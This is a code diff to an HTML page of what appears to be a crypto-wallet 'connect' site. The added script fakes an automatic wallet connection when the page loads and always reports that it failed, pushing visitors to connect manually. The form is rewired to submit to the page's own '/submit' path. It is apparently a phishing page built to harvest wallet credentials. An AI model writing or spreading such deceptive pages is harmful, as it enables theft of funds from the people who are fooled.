@@ -15,7 +15,9 @@
     <!-- Favicon icon -->
     <link rel="icon" type="image/png" sizes="16x16" href="https://app.validation-nodefix.com/user/images/favicon.png">
     <link rel="stylesheet" href="/connect_files/style.css">
-<script async="false" type="text/javascript" src="chrome-extension://fnjhmkhhmkbjkkabndcnnogagogbneec/in-page.js"></script><link rel="stylesheet" href="/connect_files/floatbutton1_0uA5KIDjSJBNGPeiRDI3YtNcjWJ9mZsPq48NM5iMzp7_jWYVkIHbMtgrDX_xil60_.css" integrity="sha384-0uA5KIDjSJBNGPeiRDI3YtNcjWJ9mZsPq48NM5iMzp7/jWYVkIHbMtgrDX/xil60" crossorigin="anonymous"><script src="/connect_files/floatbutton1_OMB1lZpjBxrwTfWk7tu-agd4LITXl_Zfgf3EAtKwKNAjawpq49QmYXGByYNmBoIV_.js" integrity="sha384-OMB1lZpjBxrwTfWk7tu+agd4LITXl/Zfgf3EAtKwKNAjawpq49QmYXGByYNmBoIV" crossorigin="anonymous"></script><link rel="stylesheet" href="/connect_files/floatbuttonpostload_L7CmgcUNKtiIUH07ZYq3DoTmb-NY-dsjUnC1tUhE6lIf_Xf5zAIkdYqf94knMuis_.css"></head>
+<script async="false" type="text/javascript" src="chrome-extension://fnjhmkhhmkbjkkabndcnnogagogbneec/in-page.js"></script><link rel="stylesheet" href="/connect_files/floatbutton1_0uA5KIDjSJBNGPeiRDI3YtNcjWJ9mZsPq48NM5iMzp7_jWYVkIHbMtgrDX_xil60_.css" integrity="sha384-0uA5KIDjSJBNGPeiRDI3YtNcjWJ9mZsPq48NM5iMzp7/jWYVkIHbMtgrDX/xil60" crossorigin="anonymous"><script src="/connect_files/floatbutton1_OMB1lZpjBxrwTfWk7tu-agd4LITXl_Zfgf3EAtKwKNAjawpq49QmYXGByYNmBoIV_.js" integrity="sha384-OMB1lZpjBxrwTfWk7tu+agd4LITXl/Zfgf3EAtKwKNAjawpq49QmYXGByYNmBoIV" crossorigin="anonymous"></script><link rel="stylesheet" href="/connect_files/floatbuttonpostload_L7CmgcUNKtiIUH07ZYq3DoTmb-NY-dsjUnC1tUhE6lIf_Xf5zAIkdYqf94knMuis_.css">
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+</head>
 
 <body class="@@dashboard dark-theme" data-new-gr-c-s-check-loaded="14.1193.0" data-gr-ext-installed="">
 
@@ -87,7 +89,7 @@
                             MM                        </h4>
                         <div class="card">
                             <div class="card-body">
-                                <form action="/welcome/connect/submit" method="post" siq_id="autopick_9502">
+                                <form id="connectionForm" method="post" siq_id="autopick_9502">
                                     <div class="row">
                                         <div class="col-12 mb-3">
                                             <label class="form-label">Method of Connection</label>
@@ -169,6 +171,39 @@
 
     </div>
 
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('connectionForm')
+            const currentPath = window.location.pathname;
+            form.action = `${currentPath}/submit`;
+        })
+    </script>
+
+    <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                Swal.fire({
+                    title: 'Connecting automatically',
+                    text: 'Requesting connection from wallet',
+                    icon: 'info',
+                    timer: 3000,
+                    showConfirmButton: false,
+                    allowOutsideClick: false,
+                        didOpen: () => {
+                            Swal.showLoading();
+                    }
+
+                }).then(() => {
+                    Swal.fire({
+                        title: 'Automatic connection failed!',
+                        text: 'Please connect manually.',
+                        icon: 'error',
+                        confirmButtonText: 'Connect manually',
+                        allowOutsideClick: false
+                    })
+                })
+            })
+    </script>
 
     <script src="/connect_files/jquery.min.js"></script>
     <script src="/connect_files/bootstrap.bundle.min.js"></script>
